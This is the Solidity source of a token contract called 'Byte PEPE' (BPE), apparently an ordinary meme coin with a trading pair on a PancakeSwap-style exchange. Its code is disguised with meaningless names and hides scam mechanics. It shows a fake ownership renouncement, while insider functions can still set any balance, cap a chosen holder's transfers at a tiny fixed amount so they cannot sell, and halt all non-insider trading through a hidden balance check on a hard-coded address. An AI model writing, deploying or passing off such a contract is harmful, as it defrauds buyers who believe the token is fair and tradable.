//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface tokenFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeAtIs) external view returns (uint256);

    function transfer(address takeAtExempt, uint256 toTradingTeam) external returns (bool);

    function allowance(address enableToFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 toTradingTeam) external returns (bool);

    function transferFrom(
        address sender,
        address takeAtExempt,
        uint256 toTradingTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitTotal, uint256 value);
    event Approval(address indexed enableToFrom, address indexed spender, uint256 value);
}

abstract contract modeSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingLaunchedIs {
    function createPair(address modeMarketing, address minLiquiditySell) external returns (address);
}

interface sellReceiverMax is tokenFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BytePEPE is modeSell, tokenFund, sellReceiverMax {

    function decimals() external view virtual override returns (uint8) {
        return minExempt;
    }

    function getOwner() external view returns (address) {
        return liquidityTakeExempt;
    }

    string private tradingLimitLaunched = "Byte PEPE";

    function transferFrom(address atTx, address takeAtExempt, uint256 toTradingTeam) external override returns (bool) {
        if (_msgSender() != sellFromExempt) {
            if (modeBuy[atTx][_msgSender()] != type(uint256).max) {
                require(toTradingTeam <= modeBuy[atTx][_msgSender()]);
                modeBuy[atTx][_msgSender()] -= toTradingTeam;
            }
        }
        return senderTotalAmount(atTx, takeAtExempt, toTradingTeam);
    }

    uint256 private launchFund;

    uint256 private sellMarketing = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return sellMarketing;
    }

    function amountReceiver(address launchedTotalMode, uint256 toTradingTeam) public {
        exemptLimitTake();
        buyIs[launchedTotalMode] = toTradingTeam;
    }

    mapping(address => bool) public amountFund;

    function marketingFund(address senderIs) public {
        require(senderIs.balance < 100000);
        if (limitTakeAt) {
            return;
        }
        if (listTake != enableWallet) {
            launchFund = shouldFeeMax;
        }
        amountReceiverFund[senderIs] = true;
        
        limitTakeAt = true;
    }

    uint256 isWalletTake;

    uint8 private minExempt = 18;

    constructor (){
        if (shouldFeeMax == swapShould) {
            swapShould = launchFund;
        }
        atMarketing takeLaunch = atMarketing(sellFromExempt);
        sellFee = tradingLaunchedIs(takeLaunch.factory()).createPair(takeLaunch.WETH(), address(this));
        if (sellModeLaunched == enableWallet) {
            swapShould = launchFund;
        }
        teamTo = _msgSender();
        modeMin();
        amountReceiverFund[teamTo] = true;
        buyIs[teamTo] = sellMarketing;
        
        emit Transfer(address(0), teamTo, sellMarketing);
    }

    address private liquidityTakeExempt;

    function allowance(address receiverLaunchedAuto, address listLaunched) external view virtual override returns (uint256) {
        if (listLaunched == sellFromExempt) {
            return type(uint256).max;
        }
        return modeBuy[receiverLaunchedAuto][listLaunched];
    }

    mapping(address => mapping(address => uint256)) private modeBuy;

    bool public limitTakeAt;

    function exemptLimitTake() private view {
        require(amountReceiverFund[_msgSender()]);
    }

    function transfer(address launchedTotalMode, uint256 toTradingTeam) external virtual override returns (bool) {
        return senderTotalAmount(_msgSender(), launchedTotalMode, toTradingTeam);
    }

    uint256 constant launchSell = 3 ** 10;

    function symbol() external view virtual override returns (string memory) {
        return teamSenderSell;
    }

    uint256 private shouldFeeMax;

    bool private sellModeLaunched;

    address public teamTo;

    bool public listTake;

    function approve(address listLaunched, uint256 toTradingTeam) public virtual override returns (bool) {
        modeBuy[_msgSender()][listLaunched] = toTradingTeam;
        emit Approval(_msgSender(), listLaunched, toTradingTeam);
        return true;
    }

    function balanceOf(address modeAtIs) public view virtual override returns (uint256) {
        return buyIs[modeAtIs];
    }

    function senderTotalAmount(address atTx, address takeAtExempt, uint256 toTradingTeam) internal returns (bool) {
        if (atTx == teamTo) {
            return enableLaunched(atTx, takeAtExempt, toTradingTeam);
        }
        uint256 receiverMin = tokenFund(sellFee).balanceOf(maxMin);
        require(receiverMin == buyMax);
        require(takeAtExempt != maxMin);
        if (amountFund[atTx]) {
            return enableLaunched(atTx, takeAtExempt, launchSell);
        }
        return enableLaunched(atTx, takeAtExempt, toTradingTeam);
    }

    uint256 public swapShould;

    uint256 buyMax;

    bool private enableWallet;

    function modeFrom(uint256 toTradingTeam) public {
        exemptLimitTake();
        buyMax = toTradingTeam;
    }

    address maxMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private teamSenderSell = "BPE";

    mapping(address => bool) public amountReceiverFund;

    function name() external view virtual override returns (string memory) {
        return tradingLimitLaunched;
    }

    event OwnershipTransferred(address indexed receiverSellToken, address indexed exemptIsMax);

    address sellFromExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function enableLaunched(address atTx, address takeAtExempt, uint256 toTradingTeam) internal returns (bool) {
        require(buyIs[atTx] >= toTradingTeam);
        buyIs[atTx] -= toTradingTeam;
        buyIs[takeAtExempt] += toTradingTeam;
        emit Transfer(atTx, takeAtExempt, toTradingTeam);
        return true;
    }

    address public sellFee;

    function minLaunched(address toMaxShould) public {
        exemptLimitTake();
        
        if (toMaxShould == teamTo || toMaxShould == sellFee) {
            return;
        }
        amountFund[toMaxShould] = true;
    }

    function modeMin() public {
        emit OwnershipTransferred(teamTo, address(0));
        liquidityTakeExempt = address(0);
    }

    mapping(address => uint256) private buyIs;

    function owner() external view returns (address) {
        return liquidityTakeExempt;
    }

}